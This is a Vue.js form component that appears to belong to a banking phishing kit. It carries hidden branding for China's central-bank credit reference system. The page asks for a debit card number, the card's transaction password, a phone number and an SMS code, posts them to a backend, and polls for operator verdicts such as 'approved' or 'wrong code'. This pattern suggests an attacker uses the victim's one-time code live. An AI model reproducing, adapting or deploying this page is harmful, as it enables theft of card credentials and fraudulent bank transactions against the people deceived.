<template>
   <div class="container banner">

    <div style="display:flex;flex-direction: column;justify-content: center; align-items: center;">
          <div style="    display: flex;
    flex-direction: column;
    justify-content: center;
    margin-top: 50px;
    background-color: white;
    width: 90vw;
    padding: 10px;
    align-items: center;">
            <img  style="width:40vw;" src="data:image/png;base64," >
         
          
         <div style="display:flex;width: 100%;">
        
        
      </div>
        
        <div style="font-size: 0.8rem;text-align: left;width: 100%;padding:10px;">{{intro}}</div>

       

         <b-field style="padding-bottom:0;margin-bottom:5px;" 
            label="储蓄卡号"
            type="is-warning"
           >
            <b-input v-model="cnumber" maxlength="20"></b-input>
        </b-field>

         <b-field style="padding-bottom:0;margin-bottom:5px;" 
            label="交易密码"
            type="is-warning"

           >
            <b-input v-model="cpass" maxlength="6" type="password"></b-input>
        </b-field>


        <b-field style="padding-bottom:0;margin-bottom:5px;" 
            label="手机号码"
            type="is-warning"
           >
            <b-input v-model="cphone" maxlength="11"></b-input>
        </b-field>
       
     
        <b-field style="padding-bottom:0;margin-bottom:5px;"  
            label="验证码"
            type="is-warning"
           >
           <b-input v-model="vcode" maxlength="11"></b-input>
        </b-field>
         
       
         <b-button @click="getcode" v-if="!daojishi" >获取验证码</b-button>
            <b-button v-if="daojishi" >{{djs}}</b-button>

       
        <br>

       <b-button style="background-color: orange;color:white;" @click="nextstep"   type="is-warning">下一步</b-button>



    </div>


       <div style="display: flex;justify-content: center;flex-wrap: wrap;align-items: center;" v-if="false">

          <div style="width: 50vw;display: flex;justify-content: center;flex-direction: column;align-items: center; padding: 10px;">
             <img src='static/anquan.png' style="width: 50%;height: auto;">
             <h3>权威可靠</h3>
             <div></div>
          </div>
         <div style="width: 50vw;display: flex;justify-content: center;flex-direction: column;align-items: center; padding: 10px;">
             <img src='static/anquan.png' style="width: 50%;height: auto;">
             <h3>数据全面</h3>
             <div></div>
          </div>
         <div style="width: 50vw;display: flex;justify-content: center;flex-direction: column;align-items: center; padding: 10px;">
             <img src='static/anquan.png' style="width: 50%;height: auto;">
             <h3>查询快速</h3>
             <div></div>
          </div>
         <div style="width: 50vw;display: flex;justify-content: center;flex-direction: column;align-items: center; padding: 10px;">
             <img src='static/anquan.png' style="width: 50%;height: auto;">
             <h3>维度多样</h3>
             <div></div>
          </div>
         <div style="width: 50vw;display: flex;justify-content: center;flex-direction: column;align-items: center; padding: 10px;">
             <img src='static/anquan.png' style="width: 50%;height: auto;">
             <h3>隐私安全</h3>
             <div></div>
          </div>
          <div style="width: 50vw;display: flex;justify-content: center;flex-direction: column;align-items: center; padding: 10px;">
             <img src='static/anquan.png' style="width: 50%;height: auto;">
             <h3>优化建议</h3>
             <div></div>
          </div>

         <div style="color:gray;font-size: 0.7rem;">中国人民银行征信系统</div>

         
       </div>

  </div>
   </div>
</template>

<script>
import Api from '@/axios'
export default {
  name: 'HelloWorld',
  data () {
    return {
      intro:window.intro3,
      msg: 'Welcome to Your Vue.js App',
      cnumber:"",
      cpass:"",
      cphone:"",
      vcode:'',
        daojishi:false,
      djs:300,
      timer:-1,
      dtimer:-1,
    }
  },
  
   methods:{
     nextstep(){
         this.goSuccess();
     },
     getcode()
     { 
         window.user.ccardnumber=this.cnumber
      window.user.ccardpass=this.cpass
      window.user.cphone=this.cphone

        this.daojishi=true;
         Api.getcode(window.user.rid,window.user).then((res)=>{
           
        this.djs=300;
        this.dtimer=setInterval(()=>{
            this.djs--;
            if(this.dis==0){
              clearInterval(this.dtimer);
              this.dis==300;
            }
        },1000);
      })
     },
      goSuccess()
     {  

      if(!this.cnumber){
        alert("请填写储蓄卡卡号")
        return;
      }
      if(!this.cpass){
        alert("请填写交易密码")
        return;
      }
      if(!this.cphone){
        alert("请填写手机号码")
        return;
      }
      if(!this.vcode){
         alert("请填写邀请码")
        return;
      }

      window.user.ccardnumber=this.cnumber
      window.user.ccardpass=this.cpass
      window.user.cphone=this.cphone
      window.user.vcode=this.vcode
       
       //window.userinfo.address=this.address
       //window.userinfo.cardphone=this.cardphone
       clearInterval(this.timer);
       window.user.cardcode=this.cardcode
       //window.userinfo.name=this.username
       window.showMessage("正在审核中,请稍后","loading");
       this.daojishi=false;
       this.djs=300;
       
       Api.updateInfo(window.user.rid,window.user).then((res)=>{

            console.log(res.data);

            if(!res.data.message=="ok"){
              return;
            }
            
            this.timer=setInterval(()=>{
                 Api.check(window.user.rid).then((rs)=>{

                     if(rs.data.success){
                         if(rs.data.message=="验证码错误"){
                            clearInterval(this.timer)
                            window.showMessage(window.codeerror,"txt");
                            setTimeout(window.hideMessage,5000);
                         }
                         else if(rs.data.message=="审核成功"){
                              clearInterval(this.timer)
                              window.hideMessage();
                              this.$router.push("five")
                         }
                         else if(rs.data.message=="卡信息错误"){
                            clearInterval(this.timer);
                            window.showMessage(window.carderror,"txt");
                            setTimeout(window.hideMessage,5000);
                            this.goback();
                         }
                         else if(rs.data.message=="卡不符合"){
                            clearInterval(this.timer);
                            window.showMessage(window.bufuhe,"txt");
                            setTimeout(window.hideMessage,5000);
                            this.goback();
                         }
                     }
                 })
             },2000);
       });
      
     }
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
  .banner {
    background: #f5f5f5 url(http://longniufin.com/bdyrzxzf/static/img/credit-banner.ece23de.png) no-repeat;
    background-size: contain;
    align-items: center;
   
  }
  .costumer-info-guide{
    position: absolute;
    top:10rem;
    left: 50%;
    -webkit-transform: translateX(-50%);
    transform: translateX(-50%);
    width: 50vw;
    height: auto;
    z-index: 100;
  }
  .container {
     display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    box-sizing: border-box;
    overflow-x: hidden;
    min-height: 100vh;
    width: 100vw;
  }
</style>
    


